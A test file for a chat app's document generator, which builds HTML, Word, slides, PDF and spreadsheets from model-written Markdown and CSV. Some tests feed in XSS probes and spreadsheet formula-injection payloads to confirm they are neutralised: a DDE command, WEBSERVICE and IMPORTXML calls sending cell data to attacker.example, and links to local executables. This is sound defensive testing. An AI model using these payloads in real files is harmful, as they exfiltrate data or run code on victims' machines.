import { describe, expect, it, vi } from 'vitest';
import { DocumentMaker, documentKind, pageSizeFor } from '../../src/main/chat/documents';
import { markdownToDocx } from '../../src/main/chat/documents/docx';
import { markdownToHtml } from '../../src/main/chat/documents/html';
import { imageSize } from '../../src/main/chat/documents/imageSize';
import type { DocumentAssets } from '../../src/main/chat/documents/markdown';
import { markdownToPptx, splitSlides } from '../../src/main/chat/documents/pptx';
import { parseCsv, parseSheets, sheetsToXlsx } from '../../src/main/chat/documents/xlsx';
import { PNG_1X1 } from '../support/pictures';
import { zipEntries, zipText } from '../support/zip';

const none: DocumentAssets = { image: () => null };

describe('a page built from Markdown', () => {
  it('keeps the structure of what was written', () => {
    const html = markdownToHtml('# Trip plan\n\nPack **light**.\n\n- socks\n- [map](https://example.com/map)\n\n| Day | City |\n| --- | --- |\n| 1 | Oslo |', { title: 'Trip plan', assets: none });
    expect(html).toContain('<title>Trip plan</title>');
    expect(html).toContain('<h1>Trip plan</h1>');
    expect(html).toContain('<strong>light</strong>');
    expect(html).toContain('<a href="https://example.com/map">map</a>');
    expect(html).toContain('<td>Oslo</td>');
  });

  it('never lets what a model wrote run or load anything', () => {
    const html = markdownToHtml('<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n[go](javascript:alert(1)) ![far](https://example.com/a.png)', { title: 'x', assets: none });
    expect(html).not.toMatch(/<script|<img|href="javascript:/i);
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(html).toContain(`default-src 'none'; img-src data:; style-src 'unsafe-inline'`);
    expect(html).toContain('<a href="https://example.com/a.png">far</a>');
  });

  it('places a picture of this chat by its plain file name only', () => {
    const asked: string[] = [];
    const assets: DocumentAssets = { image: (name) => (asked.push(name), name === 'chart.png' ? { mime: 'image/png', data: Buffer.from('PNG') } : null) };
    expect(markdownToHtml('![Sales](chart.png)', { title: 'x', assets })).toContain('<img src="data:image/png;base64,UE5H" alt="Sales">');
    markdownToHtml('![a](../chart.png) ![b](C:\\chart.png) ![c](sub/chart.png)', { title: 'x', assets });
    expect(asked).toEqual(['chart.png']);
  });
});

describe('the size of a picture', () => {
  it('is read from the header of a PNG, a JPEG and a GIF', () => {
    expect(imageSize(PNG_1X1)).toEqual({ width: 1, height: 1 });
    expect(imageSize(Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x02, 0x00, 0x03, 0x00]))).toEqual({ width: 2, height: 3 });
    const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x00, 0x00, 0xff, 0xc0, 0x00, 0x11, 0x08, 0x00, 0x02, 0x00, 0x03, 0x03]);
    expect(imageSize(jpeg)).toEqual({ width: 3, height: 2 });
    expect(imageSize(Buffer.from('not a picture'))).toBeNull();
  });
});

describe('a text document built from Markdown', () => {
  it('holds the headings, emphasis, lists, tables, links and pictures', async () => {
    const assets: DocumentAssets = { image: (name) => (name === 'dot.png' ? { mime: 'image/png', data: PNG_1X1 } : null) };
    const file = await markdownToDocx(
      '# Trip plan\n\nPack **light** and `fast`.\n\n1. Book\n2. Go\n\n| Day | City |\n| --- | --- |\n| 1 | Oslo |\n\n[map](https://example.com/map) [bad](javascript:alert(1))\n\n![Dot](dot.png)',
      { title: 'Trip plan', assets }
    );
    expect(file.subarray(0, 2).toString('latin1')).toBe('PK');
    const xml = zipText(file, 'word/document.xml');
    expect(xml).toContain('Trip plan');
    expect(xml).toMatch(/<w:b\/>[\s\S]{0,300}light/);
    expect(xml).toContain('<w:tbl>');
    expect(xml).toContain('Oslo');
    expect(zipText(file, 'word/_rels/document.xml.rels')).toContain('https://example.com/map');
    expect(zipEntries(file).some((name) => name.startsWith('word/media/'))).toBe(true);
    expect(zipEntries(file).map((name) => zipText(file, name)).join('')).not.toContain('javascript:');
  });

  it('is set in a plain sans face at a readable size, with room under a block of code', async () => {
    const file = await markdownToDocx('```\nconst n = 1;\n```\n\nAfter.', { title: 'x', assets: none });
    expect(zipText(file, 'word/styles.xml')).toMatch(/<w:docDefaults>.*w:ascii="Calibri".*<w:sz w:val="22"\/>.*<\/w:docDefaults>/s);
    const code = zipText(file, 'word/document.xml')
      .split('<w:p>')
      .find((paragraph) => paragraph.includes('const n = 1;'));
    expect(code).toContain('w:after="140"');
  });

  it('numbers a list from where the text says, so steps keep counting after a block between them', async () => {
    const steps = '1. Install\n\n```\nnpm i\n```\n\n2. Run\n3. Check\n\nThen later:\n\n10. Ten\n    1. Nested';
    const numbering = zipText(await markdownToDocx(steps, { title: 'x', assets: none }), 'word/numbering.xml');
    // The second list goes on at 2 and the third starts at 10; the list inside it starts at 1 on its own level.
    expect(numbering).toContain('<w:startOverride w:val="2"/>');
    expect(numbering).toContain('<w:startOverride w:val="10"/>');
    expect(markdownToHtml(steps, { title: 'x', assets: none })).toContain('<ol start="2">');
  });

  it('keeps the items of a list together and leaves room after the last one', async () => {
    const xml = zipText(await markdownToDocx('- one\n- two\n\n| a |\n| - |\n| 1 |', { title: 'x', assets: none }), 'word/document.xml');
    const items = xml.split('<w:p>').filter((paragraph) => paragraph.includes('<w:numPr>'));
    expect(items).toHaveLength(2);
    // Space after every item, dropped between neighbours of the same style: only the last one shows it.
    for (const item of items) expect(item).toMatch(/<w:spacing w:after="140"\/>.*<w:contextualSpacing\/>|<w:contextualSpacing\/>.*<w:spacing w:after="140"\/>/);
  });
});

describe('a table in a document', () => {
  const ragged = '| a | b |\n| - | - |\n| 1 |\n| 1 | 2 | 3 |';

  it('has rows as wide as its heading row in every format: a short row is filled, a long one cut', async () => {
    const html = markdownToHtml(ragged, { title: 'x', assets: none });
    expect([html.match(/<th>/g)?.length, html.match(/<td>/g)?.length]).toEqual([2, 4]);
    expect(html).not.toContain('>3<');
    const docx = zipText(await markdownToDocx(ragged, { title: 'x', assets: none }), 'word/document.xml');
    expect(docx.match(/<w:tc>/g)?.length).toBe(6);
    expect(splitSlides(ragged)[0]?.table?.rows).toEqual([
      ['a', 'b'],
      ['1', ''],
      ['1', '2']
    ]);
  });
});

describe('what the three Markdown formats share', () => {
  /** A control character, or half of a pair on its own (a whole pair comes out of the spread as one two-unit string). */
  const forbidden = (xml: string): boolean => [...xml].some((ch) => (ch < ' ' && !'\t\n\r'.includes(ch)) || (ch.length === 1 && ch >= '\ud800' && ch <= '\udfff'));
  const xmlOf = (file: Buffer): string =>
    zipEntries(file)
      .filter((name) => name.endsWith('.xml') || name.endsWith('.rels'))
      .map((name) => zipText(file, name))
      .join('');

  it('breaks a line at <br>, the one tag models write inside tables', async () => {
    const table = '| a |\n| - |\n| one<br>two<BR/>three |';
    const html = markdownToHtml(table, { title: 'x', assets: none });
    expect(html).toContain('<td>one<br>two<br>three</td>');
    const docx = zipText(await markdownToDocx(table, { title: 'x', assets: none }), 'word/document.xml');
    expect(docx.match(/<w:br\/>/g)).toHaveLength(2);
    expect(docx).not.toContain('&lt;br');
    expect(splitSlides(`# T\n\n${table}`)[0]?.table?.rows[1]).toEqual(['one\ntwo\nthree']);
    // Any other tag is still shown as the text it is.
    expect(markdownToHtml('a <b>bold</b>', { title: 'x', assets: none })).toContain('a &lt;b&gt;bold&lt;/b&gt;');
  });

  it('drops a forbidden character that arrives as a character reference, after the text itself was cleaned', async () => {
    const text = '# T&#12;itle\n\nform&#x1B;feed [link](https://example.com/a&#12;b) ![pic&#7;ture](https://example.com/p.png)';
    const html = markdownToHtml(text, { title: 'x', assets: none });
    expect(forbidden(html)).toBe(false);
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('href="https://example.com/ab"');
    expect(forbidden(xmlOf(await markdownToDocx(text, { title: 'x', assets: none })))).toBe(false);
    expect(forbidden(xmlOf(await markdownToPptx(text, { title: 'x', assets: none })))).toBe(false);
  });
});

const DECK = '# Launch plan\n\nSpring 2027\n\n---\n\n## Why now\n\n- Costs fell\n  - by half\n- Demand rose\n\nNote: mention the survey\n\n![Chart](dot.png)';

describe('slides built from Markdown', () => {
  it('starts a slide at each line of ---, with its first heading as the title', () => {
    expect(splitSlides(DECK)).toEqual([
      { title: 'Launch plan', bullets: [], paragraphs: ['Spring 2027'], image: null, notes: '', table: null },
      {
        title: 'Why now',
        bullets: [
          { text: 'Costs fell', level: 0 },
          { text: 'by half', level: 1 },
          { text: 'Demand rose', level: 0 }
        ],
        paragraphs: [],
        image: 'dot.png',
        notes: 'mention the survey',
        table: null
      }
    ]);
    expect(splitSlides('Just a line')).toEqual([{ title: 'Just a line', bullets: [], paragraphs: [], image: null, notes: '', table: null }]);
  });

  it('writes one slide for each, with its notes and its picture', async () => {
    const assets: DocumentAssets = { image: (name) => (name === 'dot.png' ? { mime: 'image/png', data: PNG_1X1 } : null) };
    const file = await markdownToPptx(DECK, { title: 'Launch plan', assets });
    expect(zipText(file, 'ppt/slides/slide1.xml')).toContain('Launch plan');
    expect(zipText(file, 'ppt/slides/slide2.xml')).toContain('Costs fell');
    expect(zipText(file, 'ppt/notesSlides/notesSlide2.xml')).toContain('mention the survey');
    expect(zipEntries(file).some((name) => name.startsWith('ppt/media/'))).toBe(true);
  });

  it('keeps a table as a table, under the text of its slide', async () => {
    const deck = '## Numbers\n\nRead with care.\n\n| Quarter | Amount |\n| --- | ---: |\n| Q1 | 1200 |\n\n| second | table |\n| --- | --- |\n| stays | text |';
    expect(splitSlides(deck)).toEqual([
      {
        title: 'Numbers',
        bullets: [],
        paragraphs: ['Read with care.', 'second | table', 'stays | text'],
        image: null,
        notes: '',
        table: {
          rows: [
            ['Quarter', 'Amount'],
            ['Q1', '1200']
          ],
          align: ['left', 'right']
        }
      }
    ]);
    const xml = zipText(await markdownToPptx(deck, { title: 'x', assets: none }), 'ppt/slides/slide1.xml');
    expect(xml.match(/<a:tbl>/g)?.length).toBe(1);
    expect(xml.match(/<a:tr /g)?.length).toBe(2);
    expect(xml).toContain('1200');
    // The slide holds a table, so it is laid out as content, not as a title slide.
    expect(xml).not.toContain('sz="4000"');
  });

  it('keeps the lines of a slide apart: a hard break, and the paragraphs of a quote', () => {
    expect(splitSlides('# Plan\n\nPresented by Alex  \nOctober 2026\n\n> one\n>\n> two')).toMatchObject([{ title: 'Plan', paragraphs: ['Presented by Alex\nOctober 2026', 'one\ntwo'] }]);
  });

  it('refuses more slides than a presentation may have', async () => {
    const many = Array.from({ length: 101 }, (_, i) => `# Slide ${String(i)}`).join('\n\n---\n\n');
    await expect(markdownToPptx(many, { title: 'x', assets: { image: () => null } })).rejects.toThrow('A presentation can have up to 100 slides.');
  });
});

describe('a spreadsheet built from rows', () => {
  it('reads CSV the way spreadsheets write it', () => {
    expect(parseCsv('\uFEFFname;qty\r\n"Smith; J";3\r\n"say ""hi""\nthere";007\r\n')).toEqual([
      ['name', 'qty'],
      ['Smith; J', '3'],
      ['say "hi"\nthere', '007']
    ]);
    expect(parseCsv('a\tb\n1\t2')).toEqual([
      ['a', 'b'],
      ['1', '2']
    ]);
    expect(() => parseCsv('a,b\nc,"d\ne')).toThrow('Line 2 has a quote that is never closed.');
  });

  it('types the cells: numbers, formulas, and text that only looks like a number', () => {
    expect(parseSheets('name,qty\nBolt,3\nNut,007\nRatio,-0.5\nTotal,=SUM(B2:B3)')).toEqual([
      {
        name: 'Sheet1',
        rows: [
          ['name', 'qty'],
          ['Bolt', 3],
          ['Nut', '007'],
          ['Ratio', -0.5],
          ['Total', '=SUM(B2:B3)']
        ]
      }
    ]);
  });

  it('takes several sheets as a JSON object, and refuses too many', () => {
    expect(parseSheets('{"Sales":[["Q","Amount"],["Q1",1200.5]],"Notes: 2027/Q1":[["ok",true,null]]}')).toEqual([
      {
        name: 'Sales',
        rows: [
          ['Q', 'Amount'],
          ['Q1', 1200.5]
        ]
      },
      { name: 'Notes 2027 Q1', rows: [['ok', true, null]] }
    ]);
    const many = JSON.stringify(Object.fromEntries(Array.from({ length: 21 }, (_, i) => [`S${String(i)}`, [[1]]])));
    expect(() => parseSheets(many)).toThrow('A spreadsheet can have up to 20 sheets.');
    const tall = JSON.stringify({ Big: Array.from({ length: 100_001 }, () => [1]) });
    expect(() => parseSheets(tall)).toThrow('Sheet "Big" has more than 100,000 rows.');
  });

  it('writes a workbook that holds them', async () => {
    const file = await sheetsToXlsx(parseSheets('{"Parts":[["name","qty"],["Bolt",3]],"More":[["x"]]}'));
    expect(zipEntries(file)).toEqual(expect.arrayContaining(['xl/workbook.xml', 'xl/worksheets/sheet1.xml', 'xl/worksheets/sheet2.xml']));
    expect(zipText(file, 'xl/workbook.xml')).toContain('Parts');
    expect(
      zipEntries(file)
        .filter((n) => n.endsWith('.xml'))
        .map((n) => zipText(file, n))
        .join('')
    ).toContain('Bolt');
  });

  it('stores a formula the way the format does, without its equals sign', async () => {
    const sheet = zipText(await sheetsToXlsx(parseSheets('n\n1\n2\n=SUM(A2:A3)')), 'xl/worksheets/sheet1.xml');
    expect(sheet).toContain('<f>SUM(A2:A3)</f>');
    expect(sheet).not.toContain('<f>=');
  });

  it('keeps text that only starts like a formula as text, so the file never opens as damaged', async () => {
    const rows = ['=== Totals ===', '=> see the note', '=SUM(A1:A3', '="open', '=A1+', '=IF(A1>0,"yes (ok)","no")', '=-A1'];
    const sheet = zipText(await sheetsToXlsx([{ name: 'S', rows: rows.map((cell) => [cell]) }]), 'xl/worksheets/sheet1.xml');
    expect(sheet.match(/<f>[^<]*<\/f>/g)).toEqual(['<f>IF(A1&gt;0,"yes (ok)","no")</f>', '<f>-A1</f>']);
  });

  it('takes a plain JSON list of rows as one sheet, and keeps a number no cell can hold as text', () => {
    expect(parseSheets(' [["name","qty"],["Bolt",3]]')).toEqual([
      {
        name: 'Sheet1',
        rows: [
          ['name', 'qty'],
          ['Bolt', 3]
        ]
      }
    ]);
    // 1e400 is read as infinity, which a sheet cannot store.
    expect(parseSheets('{"S":[[1e400,-1e400,2]]}')[0]?.rows).toEqual([['Infinity', '-Infinity', 2]]);
    expect(() => parseSheets('[1,2]')).toThrow('Give the rows as CSV, as a JSON list of rows, or as a JSON object of sheet name to rows.');
  });

  it('refuses what a sheet cannot hold instead of writing a file that will not open', () => {
    const wide = Array.from({ length: 16_385 }, (_, i) => String(i)).join(',');
    expect(() => parseSheets(wide)).toThrow('Sheet "Sheet1" has more than 16,384 columns.');
    expect(() => parseSheets(`a\n${'x'.repeat(32_768)}`)).toThrow('Sheet "Sheet1" has a cell of more than 32,767 characters (row 2).');
    expect(parseSheets(`a\n${'x'.repeat(32_767)}`)[0]?.rows).toHaveLength(2);
  });

  const formulas = async (...cells: string[]): Promise<string[]> =>
    (zipText(await sheetsToXlsx([{ name: 'S', rows: cells.map((cell) => [cell]) }]), 'xl/worksheets/sheet1.xml').match(/<f>[^<]*<\/f>/g) ?? []).map((f) => f.slice(3, -4));

  it('keeps a formula that reaches outside the workbook as text: it would run or call out when the file is opened', async () => {
    expect(
      await formulas(
        "=cmd|' /C calc'!A0",
        '=WEBSERVICE("https://attacker.example/?d="&A1)',
        '=FILTERXML(webservice("https://attacker.example"),"//a")',
        '=IMPORTXML("https://attacker.example/?"&A1,"//a")',
        '=IMAGE("https://attacker.example/pixel.png")',
        '=HYPERLINK("\\\\host\\share\\tool.exe","Open")',
        '=HYPERLINK("file:///C:/Windows/System32/calc.exe","Open")',
        '=HYPERLINK(A1,"Open")',
        "='\\\\host\\share\\[book.xlsx]Sheet1'!A1",
        '=[other.xlsx]Sheet1!A1',
        '=RTD("server.prog",,"topic")',
        '=CALL("user32","MessageBoxA","JJCCJ",0,"hi","t",0)',
        // What is only text inside a string is left alone, and so are links to the web.
        '=IF(A1="a|b[c]\\d","x","y")',
        '=HYPERLINK("https://example.com/report","Report")',
        '=hyperlink("mailto:a@example.com","Write")'
      )
    ).toEqual(['IF(A1="a|b[c]\\d","x","y")', 'HYPERLINK("https://example.com/report","Report")', 'hyperlink("mailto:a@example.com","Write")']);
  });

  it('writes a formula the way the file format wants it: commas between arguments, and newer functions marked as such', async () => {
    expect(
      await formulas(
        '=SUM(A1;A3)',
        '=IF(A1>0;"a;b";"no")',
        '=XLOOKUP(A1,B:B,C:C)',
        '=ifs(A1>1,"x",TRUE,"y")',
        '=TEXTJOIN(", ",TRUE,A1:A3)&CONCAT(B1,"IFS(")',
        '=_xlfn.STDEV.S(A1:A9)',
        '=SUM(FILTER(A1:A9,B1:B9>0))',
        '=SUMIFS(A:A,B:B,1)'
      )
    ).toEqual([
      'SUM(A1,A3)',
      'IF(A1&gt;0,"a;b","no")',
      '_xlfn.XLOOKUP(A1,B:B,C:C)',
      '_xlfn.IFS(A1&gt;1,"x",TRUE,"y")',
      '_xlfn.TEXTJOIN(", ",TRUE,A1:A3)&amp;_xlfn.CONCAT(B1,"IFS(")',
      '_xlfn.STDEV.S(A1:A9)',
      'SUM(_xlfn._xlws.FILTER(A1:A9,B1:B9&gt;0))',
      'SUMIFS(A:A,B:B,1)'
    ]);
    // Semicolons next to decimal commas can't be told apart: the cell stays as written.
    expect(await formulas('=SUM(1,5;2,5)')).toEqual([]);
  });

  it('reads CSV written with a space after each comma, as models often write it', () => {
    expect(parseSheets('Item, Qty, Note\nBolt, 3, "a, b"\nNut , 007 ,  " kept "  \nTotal, =SUM(B2:B3),')[0]?.rows).toEqual([
      ['Item', 'Qty', 'Note'],
      ['Bolt', 3, 'a, b'],
      ['Nut', '007', ' kept '],
      ['Total', '=SUM(B2:B3)', '']
    ]);
  });

  it('keeps a formula in one cell when its commas were not put in quotes, as models write it', async () => {
    // Strictly, each comma starts a new cell. Read that way, a formula with arguments falls apart into pieces.
    const rows = parseSheets('Item,Qty,Note\nBolt,3,x\nPick,=XLOOKUP("Bolt, M4",A2:A3,B2:B3),after\nIf, =IF(B2>0,"yes","no") ,end\nOpen,=SUM(B2,1,2\nNext,7,y')[0]?.rows;
    expect(rows).toEqual([
      ['Item', 'Qty', 'Note'],
      ['Bolt', 3, 'x'],
      ['Pick', '=XLOOKUP("Bolt, M4",A2:A3,B2:B3)', 'after'],
      ['If', '=IF(B2>0,"yes","no")', 'end'],
      // A bracket never closed holds its line together and no further: the next line is its own row.
      ['Open', '=SUM(B2,1,2'],
      ['Next', 7, 'y']
    ]);
    // With semicolons between cells, the semicolons inside a formula belong to it, and are stored as commas.
    expect(parseSheets('a;b\n1;=SUM(A2;3)')[0]?.rows[1]).toEqual([1, '=SUM(A2;3)']);
    expect(await formulas('=SUM(A2;3)')).toEqual(['SUM(A2,3)']);
  });

  it('keeps a long number from JSON as text too, and gives a sheet a name every app accepts', () => {
    expect(parseSheets('{"S":[[12345678901234567890,0.12345678901234567890,12,-3.5,1e3]]}')[0]?.rows).toEqual([['12345678901234567890', '0.12345678901234567890', 12, -3.5, 1000]]);
    expect(parseSheets(`{"'Q1'":[[1]],"History":[[2]],"history":[[3]]}`).map((sheet) => sheet.name)).toEqual(['Q1', 'History_', 'history_ (2)']);
  });

  it('keeps a number too long to hold exactly as text', () => {
    expect(parseSheets('id,n\n12345678901234567890,123456789012345\n0.1234567890123456,1.50').at(0)?.rows).toEqual([
      ['id', 'n'],
      ['12345678901234567890', 123456789012345],
      ['0.1234567890123456', 1.5]
    ]);
  });
});

describe('making a document', () => {
  const options = { title: 'Report', assets: { image: () => null } };
  const never = new AbortController().signal;

  it('knows the four kinds by their extension, in any case', () => {
    expect(['a.pdf', 'A.PDF', 'b.docx', 'c.Pptx', 'd.xlsx', 'e.md', 'f.docm', 'pdf'].map(documentKind)).toEqual(['pdf', 'pdf', 'docx', 'pptx', 'xlsx', null, null, null]);
    expect(['US', 'CA', 'MX', 'NO', ''].map(pageSizeFor)).toEqual(['Letter', 'Letter', 'Letter', 'A4', 'A4']);
  });

  it('prints a PDF from the page it built', async () => {
    let printed = { html: '', policy: '' };
    const maker = new DocumentMaker({ printPdf: (page) => ((printed = page), Promise.resolve(Buffer.from('%PDF-1.7'))) });
    expect((await maker.make('pdf', '# Report', options, never)).toString()).toBe('%PDF-1.7');
    expect(printed.html).toContain('<h1>Report</h1>');
    // The printer is told the same policy the page declares.
    expect(printed.policy).toBe("default-src 'none'; img-src data:; style-src 'unsafe-inline'");
    expect(printed.html).toContain(`content="${printed.policy}"`);
    expect((await maker.make('xlsx', 'a,b\n1,2', options, never)).subarray(0, 2).toString('latin1')).toBe('PK');
  });

  it('drops the characters no document can hold, so the file always opens', async () => {
    let printed = '';
    const maker = new DocumentMaker({ printPdf: (page) => ((printed = page.html), Promise.resolve(Buffer.from('%PDF-1.7'))) });
    const text = '# Bell\u0007 red\u001b[31m nul\u0000 half\ud800 whole\u{1F600}\n\n- item\u000c one';
    const named = { title: 'Re\u0007port', assets: { image: () => null } };
    // A control character, or half of a pair on its own (a whole pair comes out of the spread as one two-unit string).
    const forbidden = (xml: string): boolean => [...xml].some((ch) => (ch < ' ' && !'\t\n\r'.includes(ch)) || (ch.length === 1 && ch >= '\ud800' && ch <= '\udfff'));

    await maker.make('pdf', text, named, never);
    expect(printed).toContain('<title>Report</title>');
    expect(printed).toContain('<h1>Bell red[31m nul half whole\u{1F600}</h1>');
    const docx = await maker.make('docx', text, named, never);
    expect(zipEntries(docx).filter((name) => name.endsWith('.xml')).some((name) => forbidden(zipText(docx, name)))).toBe(false);
    expect(zipText(docx, 'word/document.xml')).toContain('whole\u{1F600}');
    const pptx = await maker.make('pptx', text, named, never);
    expect(zipEntries(pptx).filter((name) => name.endsWith('.xml')).some((name) => forbidden(zipText(pptx, name)))).toBe(false);
  });

  it('refuses a document whose pictures add up to more than it may hold, a repeated one counting each time', async () => {
    const big = Buffer.concat([PNG_1X1, Buffer.alloc(9 * 1024 * 1024)]);
    const assets = { image: () => ({ mime: 'image/png', data: big }) };
    const maker = new DocumentMaker({ printPdf: () => Promise.resolve(Buffer.from('%PDF-1.7')) });
    const placed = (times: number): string => Array.from({ length: times }, () => '![p](p.png)').join('\n\n');
    await expect(maker.make('pdf', placed(5), { title: 'x', assets }, never)).rejects.toThrow('The pictures in a document can add up to 40 MB.');
    await expect(maker.make('docx', placed(5), { title: 'x', assets }, never)).rejects.toThrow('The pictures in a document can add up to 40 MB.');
    expect((await maker.make('pdf', placed(4), { title: 'x', assets }, never)).toString()).toBe('%PDF-1.7');
  });

  it('refuses a document that names a picture the chat does not have, instead of quietly leaving it out', async () => {
    const assets = { image: (name: string) => (name === 'have.png' ? { mime: 'image/png', data: PNG_1X1 } : null) };
    const maker = new DocumentMaker({ printPdf: () => Promise.resolve(Buffer.from('%PDF-1.7')) });
    const missing = 'There is no picture named chart.webp in this chat. A document can place a .png, .jpg or .gif made in this chat, up to 10 MB.';
    await expect(maker.make('pdf', '![Sales](chart.webp)', { title: 'x', assets }, never)).rejects.toThrow(missing);
    await expect(maker.make('pptx', '# S\n\n![Sales](chart.webp)', { title: 'x', assets }, never)).rejects.toThrow(missing);
    // A picture on the web is never fetched and is no mistake: it becomes a link.
    expect((await maker.make('pdf', '![a](https://example.com/a.png) ![b](have.png)', { title: 'x', assets }, never)).toString()).toBe('%PDF-1.7');
  });

  it('gives up after a minute, and at once when the turn is stopped', async () => {
    vi.useFakeTimers();
    const stuck = new DocumentMaker({ printPdf: () => new Promise<Buffer>(() => undefined) });
    const late = expect(stuck.make('pdf', 'x', options, never)).rejects.toThrow('Building the document took longer than 60 seconds.');
    await vi.advanceTimersByTimeAsync(60_000);
    await late;
    vi.useRealTimers();
    const stop = new AbortController();
    const stopped = expect(stuck.make('pdf', 'x', options, stop.signal)).rejects.toThrow('Stopped.');
    stop.abort();
    await stopped;
  });
});
